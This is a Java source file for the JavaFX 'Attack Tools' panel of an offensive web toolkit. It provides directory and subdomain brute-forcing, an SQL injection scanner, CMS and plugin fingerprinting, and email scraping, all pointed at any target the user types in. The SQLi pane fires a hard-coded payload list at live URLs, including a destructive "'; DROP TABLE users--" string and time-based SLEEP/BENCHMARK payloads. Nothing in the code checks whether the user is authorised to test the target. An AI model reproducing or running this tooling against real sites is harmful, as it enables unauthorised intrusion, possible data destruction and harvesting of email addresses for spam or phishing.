package com.abyss.toolkit.ui;

import com.abyss.toolkit.db.DatabaseManager;
import javafx.application.Platform;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.Node;
import javafx.scene.control.*;
import javafx.scene.layout.*;
import javafx.stage.FileChooser;

import java.io.*;
import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class AttackViews {

    public static class AttackView extends VBox {
        public AttackView() {
            setSpacing(15);
            setPadding(new Insets(20));
            setStyle("-fx-background-color: #0B0B0E;");
            getChildren().addAll(
                    new Label("✦ Attack Tools") {{
                        setStyle("-fx-font-size: 24px; -fx-font-weight: 700; -fx-text-fill: #F5C96A;");
                    }},
                    new Separator(),
                    buildTabs()
            );
        }

        private TabPane buildTabs() {
            TabPane tabs = new TabPane();
            tabs.setTabClosingPolicy(TabPane.TabClosingPolicy.UNAVAILABLE);
            tabs.setStyle("-fx-background-color: transparent;");
            tabs.getTabs().addAll(
                    new Tab("Directory Bruteforce", new DirBruteforcePane()),
                    new Tab("SQL Injection", new SqliScannerPane()),
                    new Tab("Subdomain Scanner", new SubdomainScannerPane()),
                    new Tab("CMS Detector", new CmsDetectorPane()),
                    new Tab("Email Extractor", new EmailExtractorPane())
            );
            return tabs;
        }
    }

    // ================================================================
    // DIRECTORY BRUTEFORCE
    // ================================================================
    private static class DirBruteforcePane extends VBox {
        private final TextField target = new TextField("https://example.com");
        private final TextField extensions = new TextField("php,html,txt,asp,aspx,jsp");
        private final Spinner<Integer> threads = new Spinner<>(1, 200, 50);
        private final Button startBtn = new Button("▶ Start");
        private final Button stopBtn = new Button("⏹ Stop");
        private final ProgressBar progress = new ProgressBar(0);
        private final ListView<String> resultsList = new ListView<>();
        private final TextArea log = new TextArea();
        private final Label wordlistStatus = new Label("📄 No wordlist loaded");
        private final Label resultCount = new Label("Found: 0");
        private final List<String> wordlist = new ArrayList<>();
        private final AtomicBoolean stopped = new AtomicBoolean(false);
        private Thread scanThread;

        public DirBruteforcePane() {
            setSpacing(12);
            setPadding(new Insets(15));
            setStyle("-fx-background-color: #0B0B0E;");

            target.setPromptText("https://example.com");
            target.getStyleClass().add("text-field");
            extensions.setPromptText("php,html,txt");
            threads.setPrefWidth(80);
            wordlistStatus.setStyle("-fx-text-fill: #5A5A6A; -fx-font-size: 13px;");

            startBtn.getStyleClass().add("button-primary");
            stopBtn.getStyleClass().add("button-danger");
            stopBtn.setDisable(true);

            Button loadWordlist = new Button("📂 Load Wordlist");
            loadWordlist.getStyleClass().add("button");

            resultsList.setPrefHeight(320);
            resultsList.setPlaceholder(new Label("🔍 No results yet. Load a wordlist and start."));
            resultsList.setOnMouseClicked(e -> {
                if (e.getClickCount() == 2) {
                    String selected = resultsList.getSelectionModel().getSelectedItem();
                    if (selected != null) {
                        showDetailDialog("Directory Found", selected);
                    }
                }
            });

            log.setEditable(false);
            log.setPrefHeight(100);
            log.getStyleClass().add("console-output");

            progress.setPrefWidth(Double.MAX_VALUE);

            resultCount.setStyle("-fx-text-fill: #F5C96A; -fx-font-weight: 700; -fx-font-size: 14px;");

            loadWordlist.setOnAction(e -> loadWordlist());
            startBtn.setOnAction(e -> startScan());
            stopBtn.setOnAction(e -> stopScan());

            HBox controls = new HBox(10, new Label("Target:"), target, loadWordlist, wordlistStatus);
            controls.setAlignment(Pos.CENTER_LEFT);
            HBox controls2 = new HBox(10, new Label("Extensions:"), extensions, new Label("Threads:"), threads, startBtn, stopBtn, resultCount);
            controls2.setAlignment(Pos.CENTER_LEFT);

            VBox.setVgrow(resultsList, Priority.ALWAYS);

            getChildren().addAll(controls, controls2, progress, resultsList, log);
        }

        private void loadWordlist() {
            FileChooser fc = new FileChooser();
            fc.getExtensionFilters().add(new FileChooser.ExtensionFilter("Wordlist", "*.txt", "*.lst", "*.dic"));
            var file = fc.showOpenDialog(getScene().getWindow());
            if (file != null) {
                try {
                    wordlist.clear();
                    wordlist.addAll(Files.readAllLines(file.toPath()));
                    wordlistStatus.setText("📄 Loaded: " + wordlist.size() + " entries from " + file.getName());
                    wordlistStatus.setStyle("-fx-text-fill: #8BC34A; -fx-font-size: 13px;");
                } catch (IOException ex) {
                    wordlistStatus.setText("❌ Error: " + ex.getMessage());
                    wordlistStatus.setStyle("-fx-text-fill: #FF5252; -fx-font-size: 13px;");
                }
            }
        }

        private void startScan() {
            if (wordlist.isEmpty()) {
                log.setText("⚠️ Load a wordlist first.");
                return;
            }

            String baseUrl = target.getText().trim();
            if (!baseUrl.startsWith("http")) baseUrl = "https://" + baseUrl;
            if (baseUrl.endsWith("/")) baseUrl = baseUrl.substring(0, baseUrl.length() - 1);

            String extStr = extensions.getText().trim();
            String[] extList = extStr.isEmpty() ? new String[]{""} : extStr.split(",");
            for (int i = 0; i < extList.length; i++) extList[i] = extList[i].trim();

            stopped.set(false);
            startBtn.setDisable(true);
            stopBtn.setDisable(false);
            resultsList.getItems().clear();
            log.clear();
            progress.setProgress(0);
            resultCount.setText("Found: 0");

            final String fBaseUrl = baseUrl;
            final String[] fExtList = extList;
            final List<String> wl = new ArrayList<>(wordlist);
            final int total = wl.size() * (fExtList.length == 0 ? 1 : fExtList.length);

            scanThread = new Thread(() -> {
                HttpClient client = HttpClient.newBuilder()
                        .connectTimeout(Duration.ofSeconds(5))
                        .followRedirects(HttpClient.Redirect.NEVER)
                        .build();

                AtomicInteger done = new AtomicInteger();
                AtomicInteger found = new AtomicInteger();

                for (String word : wl) {
                    if (stopped.get()) break;
                    for (String ext : fExtList) {
                        if (stopped.get()) break;
                        final String fExt = ext;
                        final String fWord = word;
                        String path = fWord.trim();
                        if (!fExt.isEmpty()) path += "." + fExt;
                        final String fPath = path;
                        String url = fBaseUrl + "/" + fPath;
                        try {
                            HttpRequest req = HttpRequest.newBuilder(URI.create(url))
                                    .timeout(Duration.ofSeconds(5))
                                    .GET().build();
                            HttpResponse<String> resp = client.send(req, HttpResponse.BodyHandlers.ofString());
                            int status = resp.statusCode();
                            if (status >= 200 && status < 400) {
                                found.incrementAndGet();
                                final int fStatus = status;
                                Platform.runLater(() -> {
                                    resultsList.getItems().add("✅ [" + fStatus + "] " + fPath);
                                    resultCount.setText("Found: " + found.get());
                                    log.appendText("[" + fStatus + "] " + url + "\n");
                                });
                            }
                        } catch (Exception ignored) {}
                        int current = done.incrementAndGet();
                        Platform.runLater(() -> progress.setProgress((double) current / total));
                    }
                }

                Platform.runLater(() -> {
                    startBtn.setDisable(false);
                    stopBtn.setDisable(true);
                    if (found.get() == 0) {
                        log.appendText("\n⚠️ No paths found. Try a different wordlist or extensions.\n");
                        resultsList.setPlaceholder(new Label("⚠️ No results found. Try a different wordlist."));
                    } else {
                        log.appendText("\n✅ Done. Found " + found.get() + " entries.\n");
                    }
                    DatabaseManager.recordScan("attack", fBaseUrl, "dirbruteforce " + found.get() + " found", "");
                });
            });
            scanThread.start();
        }

        private void stopScan() {
            stopped.set(true);
            stopBtn.setDisable(true);
            startBtn.setDisable(false);
            log.appendText("⏹ Stopped by user.\n");
        }
    }

    // ================================================================
    // SQL INJECTION SCANNER
    // ================================================================
    private static class SqliScannerPane extends VBox {
        private final TextField urlField = new TextField("https://example.com/page?id=1");
        private final TextField paramField = new TextField("id");
        private final Button scanBtn = new Button("▶ Scan SQLi");
        private final TextArea output = new TextArea();
        private final Label statusLabel = new Label("Ready");

        public SqliScannerPane() {
            setSpacing(12);
            setPadding(new Insets(15));
            setStyle("-fx-background-color: #0B0B0E;");

            urlField.setPromptText("https://example.com/page?id=1");
            paramField.setPromptText("id");
            scanBtn.getStyleClass().add("button-danger");

            output.setEditable(false);
            output.setPrefHeight(350);
            output.getStyleClass().add("console-output");

            statusLabel.setStyle("-fx-text-fill: #5A5A6A; -fx-font-size: 13px;");

            scanBtn.setOnAction(e -> startScan());

            HBox controls = new HBox(10, new Label("URL:"), urlField, new Label("Param:"), paramField, scanBtn, statusLabel);
            controls.setAlignment(Pos.CENTER_LEFT);
            getChildren().addAll(controls, output);
        }

        private void startScan() {
            output.clear();
            String baseUrl = urlField.getText().trim();
            String paramName = paramField.getText().trim();

            if (!baseUrl.contains("?")) {
                output.setText("⚠️ URL must contain a query parameter (e.g. ?id=1)");
                return;
            }
            if (paramName.isEmpty()) {
                output.setText("⚠️ Enter a parameter name.");
                return;
            }

            final String fBaseUrl = baseUrl;
            final String fParamName = paramName;
            statusLabel.setText("⏳ Scanning...");
            statusLabel.setStyle("-fx-text-fill: #F5C96A; -fx-font-size: 13px;");
            scanBtn.setDisable(true);

            output.appendText("🔍 Scanning for SQL injection on " + fBaseUrl + "\n\n");

            new Thread(() -> {
                String[] payloads = {
                    "'", "\"", "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--",
                    "' AND 1=1--", "' AND 1=2--", "'; DROP TABLE users--",
                    "' OR SLEEP(5)--", "' OR BENCHMARK(1000000,MD5(1))--"
                };

                HttpClient client = HttpClient.newBuilder()
                        .connectTimeout(Duration.ofSeconds(6))
                        .followRedirects(HttpClient.Redirect.NEVER)
                        .build();

                List<String> vulnerable = new ArrayList<>();
                AtomicInteger tested = new AtomicInteger(0);

                for (String payload : payloads) {
                    tested.incrementAndGet();
                    final String fPayload = payload;
                    String paramValue = getParamValue(fBaseUrl, fParamName);
                    String encodedPayload = URLEncoder.encode(fPayload, StandardCharsets.UTF_8);
                    String testUrl = fBaseUrl.replace(fParamName + "=" + paramValue, fParamName + "=" + encodedPayload);

                    try {
                        HttpRequest req = HttpRequest.newBuilder(URI.create(testUrl))
                                .timeout(Duration.ofSeconds(6))
                                .GET().build();
                        long start = System.currentTimeMillis();
                        HttpResponse<String> resp = client.send(req, HttpResponse.BodyHandlers.ofString());
                        long time = System.currentTimeMillis() - start;
                        String body = resp.body().toLowerCase();

                        boolean errorBased = body.contains("sql") || body.contains("mysql") ||
                                body.contains("syntax") || body.contains("unclosed") ||
                                body.contains("quoted") || body.contains("warning") ||
                                body.contains("odbc") || body.contains("driver");
                        boolean timeBased = time > 4000 && (fPayload.contains("SLEEP") || fPayload.contains("BENCHMARK"));

                        final String resultPrefix = "[" + resp.statusCode() + "] " + fPayload + " -> ";
                        if (errorBased) {
                            vulnerable.add(fPayload);
                            Platform.runLater(() -> output.appendText(resultPrefix + "⚠️ ERROR-BASED VULNERABLE!\n"));
                        } else if (timeBased) {
                            vulnerable.add(fPayload);
                            Platform.runLater(() -> output.appendText(resultPrefix + "🐢 TIME-BASED VULNERABLE! (" + time + "ms)\n"));
                        } else {
                            Platform.runLater(() -> output.appendText(resultPrefix + "Not vulnerable\n"));
                        }
                    } catch (Exception ex) {
                        Platform.runLater(() -> output.appendText("[ERROR] " + ex.getMessage() + "\n"));
                    }
                }

                final int testedCount = tested.get();
                Platform.runLater(() -> {
                    scanBtn.setDisable(false);
                    output.appendText("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
                    output.appendText("📊 Tested " + testedCount + " payloads\n");
                    if (vulnerable.isEmpty()) {
                        output.appendText("✅ No SQL injection detected with basic payloads.\n");
                        statusLabel.setText("✅ No vulnerabilities found");
                        statusLabel.setStyle("-fx-text-fill: #8BC34A; -fx-font-size: 13px;");
                    } else {
                        output.appendText("❌ VULNERABLE TO SQL INJECTION!\n");
                        output.appendText("   Payloads that worked: " + String.join(", ", vulnerable) + "\n");
                        statusLabel.setText("❌ VULNERABLE! " + vulnerable.size() + " payloads worked");
                        statusLabel.setStyle("-fx-text-fill: #FF5252; -fx-font-size: 13px; -fx-font-weight: 700;");
                        DatabaseManager.recordScan("attack", fBaseUrl, "sqli vulnerable: " + String.join(", ", vulnerable), "");
                    }
                });
            }).start();
        }

        private String getParamValue(String url, String paramName) {
            try {
                String query = url.split("\\?")[1];
                for (String part : query.split("&")) {
                    if (part.startsWith(paramName + "=")) {
                        return part.split("=")[1];
                    }
                }
            } catch (Exception ignored) {}
            return "1";
        }
    }

    // ================================================================
    // SUBDOMAIN SCANNER
    // ================================================================
    private static class SubdomainScannerPane extends VBox {
        private final TextField domainField = new TextField("example.com");
        private final Button loadWordlist = new Button("📂 Load Wordlist");
        private final Label wordlistStatus = new Label("📄 No wordlist loaded");
        private final Button scanBtn = new Button("▶ Scan Subdomains");
        private final ProgressBar progress = new ProgressBar(0);
        private final ListView<String> resultsList = new ListView<>();
        private final TextArea log = new TextArea();
        private final Label resultCount = new Label("Found: 0");
        private final List<String> wordlist = new ArrayList<>();

        public SubdomainScannerPane() {
            setSpacing(12);
            setPadding(new Insets(15));
            setStyle("-fx-background-color: #0B0B0E;");

            domainField.setPromptText("example.com");
            wordlistStatus.setStyle("-fx-text-fill: #5A5A6A; -fx-font-size: 13px;");

            loadWordlist.getStyleClass().add("button");
            scanBtn.getStyleClass().add("button-primary");

            resultsList.setPrefHeight(320);
            resultsList.setPlaceholder(new Label("🔍 No results yet. Load a wordlist and start."));
            resultsList.setOnMouseClicked(e -> {
                if (e.getClickCount() == 2) {
                    String selected = resultsList.getSelectionModel().getSelectedItem();
                    if (selected != null) {
                        showDetailDialog("Subdomain Detail", selected);
                    }
                }
            });

            log.setEditable(false);
            log.setPrefHeight(100);
            log.getStyleClass().add("console-output");
            progress.setPrefWidth(Double.MAX_VALUE);

            resultCount.setStyle("-fx-text-fill: #F5C96A; -fx-font-weight: 700; -fx-font-size: 14px;");

            loadWordlist.setOnAction(e -> loadWordlist());
            scanBtn.setOnAction(e -> startScan());

            HBox controls = new HBox(10, new Label("Domain:"), domainField, loadWordlist, wordlistStatus);
            controls.setAlignment(Pos.CENTER_LEFT);
            HBox controls2 = new HBox(10, scanBtn, resultCount);
            controls2.setAlignment(Pos.CENTER_LEFT);

            VBox.setVgrow(resultsList, Priority.ALWAYS);
            getChildren().addAll(controls, controls2, progress, resultsList, log);
        }

        private void loadWordlist() {
            FileChooser fc = new FileChooser();
            fc.getExtensionFilters().add(new FileChooser.ExtensionFilter("Wordlist", "*.txt", "*.lst", "*.dic"));
            var file = fc.showOpenDialog(getScene().getWindow());
            if (file != null) {
                try {
                    wordlist.clear();
                    wordlist.addAll(Files.readAllLines(file.toPath()));
                    wordlistStatus.setText("📄 Loaded: " + wordlist.size() + " entries from " + file.getName());
                    wordlistStatus.setStyle("-fx-text-fill: #8BC34A; -fx-font-size: 13px;");
                } catch (IOException ex) {
                    wordlistStatus.setText("❌ Error: " + ex.getMessage());
                    wordlistStatus.setStyle("-fx-text-fill: #FF5252; -fx-font-size: 13px;");
                }
            }
        }

        private void startScan() {
            if (wordlist.isEmpty()) {
                log.setText("⚠️ Load a subdomain wordlist first.");
                return;
            }

            String baseDomain = domainField.getText().trim();
            if (baseDomain.startsWith("http")) baseDomain = baseDomain.replaceFirst("^https?://", "");

            final String fBaseDomain = baseDomain;
            final List<String> wl = new ArrayList<>(wordlist);
            final int total = wl.size();

            resultsList.getItems().clear();
            log.clear();
            progress.setProgress(0);
            resultCount.setText("Found: 0");
            scanBtn.setDisable(true);

            new Thread(() -> {
                HttpClient client = HttpClient.newBuilder()
                        .connectTimeout(Duration.ofSeconds(5))
                        .followRedirects(HttpClient.Redirect.NEVER)
                        .build();

                AtomicInteger done = new AtomicInteger();
                AtomicInteger found = new AtomicInteger();

                for (String sub : wl) {
                    final String fSub = sub;
                    String subdomain = fSub.trim() + "." + fBaseDomain;
                    String url = "https://" + subdomain;
                    try {
                        HttpRequest req = HttpRequest.newBuilder(URI.create(url))
                                .timeout(Duration.ofSeconds(4))
                                .GET().build();
                        HttpResponse<String> resp = client.send(req, HttpResponse.BodyHandlers.ofString());
                        if (resp.statusCode() >= 200 && resp.statusCode() < 400) {
                            found.incrementAndGet();
                            final int fStatus = resp.statusCode();
                            final String fSubdomain = subdomain;
                            Platform.runLater(() -> {
                                resultsList.getItems().add("✅ " + fSubdomain + " -> " + fStatus);
                                resultCount.setText("Found: " + found.get());
                                log.appendText("✅ " + fSubdomain + " (HTTP " + fStatus + ")\n");
                            });
                        }
                    } catch (Exception ignored) {}
                    int current = done.incrementAndGet();
                    Platform.runLater(() -> progress.setProgress((double) current / total));
                }

                Platform.runLater(() -> {
                    scanBtn.setDisable(false);
                    if (found.get() == 0) {
                        log.appendText("\n⚠️ No subdomains found. Try a different wordlist.\n");
                        resultsList.setPlaceholder(new Label("⚠️ No subdomains found. Try a different wordlist."));
                    } else {
                        log.appendText("\n✅ Done. Found " + found.get() + " subdomains.\n");
                    }
                    DatabaseManager.recordScan("attack", fBaseDomain, "subdomain " + found.get() + " found", "");
                });
            }).start();
        }
    }

    // ================================================================
    // CMS DETECTOR
    // ================================================================
    private static class CmsDetectorPane extends VBox {
        private final TextField urlField = new TextField("https://example.com");
        private final Button scanBtn = new Button("▶ Detect CMS");
        private final TextArea output = new TextArea();

        public CmsDetectorPane() {
            setSpacing(12);
            setPadding(new Insets(15));
            setStyle("-fx-background-color: #0B0B0E;");

            urlField.setPromptText("https://example.com");
            scanBtn.getStyleClass().add("button-primary");

            output.setEditable(false);
            output.setPrefHeight(350);
            output.getStyleClass().add("console-output");
            output.setPromptText("CMS detection results will appear here...");

            scanBtn.setOnAction(e -> detectCms());

            HBox controls = new HBox(10, new Label("URL:"), urlField, scanBtn);
            controls.setAlignment(Pos.CENTER_LEFT);
            getChildren().addAll(controls, output);
        }

        private void detectCms() {
            output.clear();
            final String url = urlField.getText().trim();
            final String fUrl = url.startsWith("http") ? url : "https://" + url;

            output.appendText("🔍 Detecting CMS for " + fUrl + "\n\n");

            new Thread(() -> {
                try {
                    HttpClient client = HttpClient.newBuilder()
                            .connectTimeout(Duration.ofSeconds(8))
                            .followRedirects(HttpClient.Redirect.NORMAL)
                            .build();

                    HttpRequest req = HttpRequest.newBuilder(URI.create(fUrl))
                            .timeout(Duration.ofSeconds(8))
                            .GET().build();

                    HttpResponse<String> resp = client.send(req, HttpResponse.BodyHandlers.ofString());
                    String body = resp.body();

                    List<String> results = new ArrayList<>();
                    results.add("📍 Target: " + fUrl);
                    results.add("━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
                    results.add("");

                    // WordPress
                    if (body.contains("wp-content") || body.contains("wp-includes") || body.contains("wp-json")) {
                        results.add("✅ WordPress detected!");
                        Pattern p = Pattern.compile("wp-content/themes/([^/]+)");
                        Matcher m = p.matcher(body);
                        if (m.find()) results.add("   Theme: " + m.group(1));
                        Pattern p2 = Pattern.compile("wp-content/plugins/([^/]+)");
                        Matcher m2 = p2.matcher(body);
                        Set<String> plugins = new HashSet<>();
                        while (m2.find()) plugins.add(m2.group(1));
                        if (!plugins.isEmpty()) results.add("   Plugins: " + String.join(", ", plugins));
                    }

                    // Joomla
                    if (body.contains("joomla") || body.contains("com_content") || body.contains("Joomla")) {
                        results.add("✅ Joomla detected!");
                        Pattern p = Pattern.compile("template=([^&\"]+)");
                        Matcher m = p.matcher(body);
                        if (m.find()) results.add("   Template: " + m.group(1));
                    }

                    // Drupal
                    if (body.contains("drupal") || body.contains("Drupal") || body.contains("sites/default/files")) {
                        results.add("✅ Drupal detected!");
                    }

                    // Magento
                    if (body.contains("Magento") || body.contains("skin/frontend/")) {
                        results.add("✅ Magento detected!");
                    }

                    // Shopify
                    if (body.contains("shopify") || body.contains("cdn.shopify.com")) {
                        results.add("✅ Shopify detected!");
                    }

                    if (results.size() <= 3) {
                        results.add("❌ No known CMS detected.");
                        results.add("ℹ️ This may be a custom-built site or a very obscure CMS.");
                    }

                    final List<String> finalResults = results;
                    Platform.runLater(() -> {
                        output.setText(String.join("\n", finalResults));
                        DatabaseManager.recordScan("attack", fUrl, "cms detection", "");
                    });

                } catch (Exception e) {
                    Platform.runLater(() -> output.setText("❌ Error: " + e.getMessage()));
                }
            }).start();
        }
    }

    // ================================================================
    // EMAIL EXTRACTOR
    // ================================================================
    private static class EmailExtractorPane extends VBox {
        private final TextField urlField = new TextField("https://example.com");
        private final Button scanBtn = new Button("▶ Extract Emails");
        private final TextArea output = new TextArea();

        public EmailExtractorPane() {
            setSpacing(12);
            setPadding(new Insets(15));
            setStyle("-fx-background-color: #0B0B0E;");

            urlField.setPromptText("https://example.com");
            scanBtn.getStyleClass().add("button-primary");

            output.setEditable(false);
            output.setPrefHeight(350);
            output.getStyleClass().add("console-output");
            output.setPromptText("Email extraction results will appear here...");

            scanBtn.setOnAction(e -> extractEmails());

            HBox controls = new HBox(10, new Label("URL:"), urlField, scanBtn);
            controls.setAlignment(Pos.CENTER_LEFT);
            getChildren().addAll(controls, output);
        }

        private void extractEmails() {
            output.clear();
            final String url = urlField.getText().trim();
            final String fUrl = url.startsWith("http") ? url : "https://" + url;

            output.appendText("📧 Extracting emails from " + fUrl + "\n\n");

            new Thread(() -> {
                try {
                    HttpClient client = HttpClient.newBuilder()
                            .connectTimeout(Duration.ofSeconds(8))
                            .followRedirects(HttpClient.Redirect.NORMAL)
                            .build();

                    HttpRequest req = HttpRequest.newBuilder(URI.create(fUrl))
                            .timeout(Duration.ofSeconds(8))
                            .GET().build();

                    HttpResponse<String> resp = client.send(req, HttpResponse.BodyHandlers.ofString());
                    String body = resp.body();

                    Pattern emailPattern = Pattern.compile("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");
                    Matcher matcher = emailPattern.matcher(body);

                    Set<String> emails = new LinkedHashSet<>();
                    while (matcher.find()) {
                        emails.add(matcher.group());
                    }

                    List<String> results = new ArrayList<>();
                    results.add("📧 Email Extraction Results");
                    results.add("━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
                    results.add("Target: " + fUrl);
                    results.add("Total emails found: " + emails.size());
                    results.add("");

                    if (emails.isEmpty()) {
                        results.add("❌ No emails found on this page.");
                    } else {
                        for (String email : emails) {
                            results.add("  • " + email);
                        }
                    }

                    final List<String> finalResults = results;
                    Platform.runLater(() -> {
                        output.setText(String.join("\n", finalResults));
                        DatabaseManager.recordScan("attack", fUrl, "email extract " + emails.size() + " found", "");
                    });

                } catch (Exception e) {
                    Platform.runLater(() -> output.setText("❌ Error: " + e.getMessage()));
                }
            }).start();
        }
    }

    // ================================================================
    // Utility: Detail Dialog
    // ================================================================
    private static void showDetailDialog(String title, String content) {
        Alert detail = new Alert(Alert.AlertType.INFORMATION);
        detail.setTitle(title);
        detail.setHeaderText("Details");
        detail.setContentText(content);
        detail.initOwner(null);
        detail.showAndWait();
    }
}